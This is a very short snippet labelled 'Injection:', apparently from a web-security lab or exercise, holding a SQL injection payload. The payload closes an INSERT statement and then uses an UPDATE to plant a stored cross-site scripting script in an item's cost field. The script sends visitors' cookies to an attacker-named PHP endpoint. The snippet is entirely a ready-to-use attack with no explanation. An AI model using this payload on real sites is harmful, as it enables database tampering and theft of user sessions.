Injection:

email', 'hash', 'salt', '0'); 
UPDATE items SET cost = '<script>var cookies = document.cookie; window.location.replace(\"https://127.0.0.1/attackerDir/xss.php?\" + cookies);</script>' WHERE itemName = 'apple'; 
--#
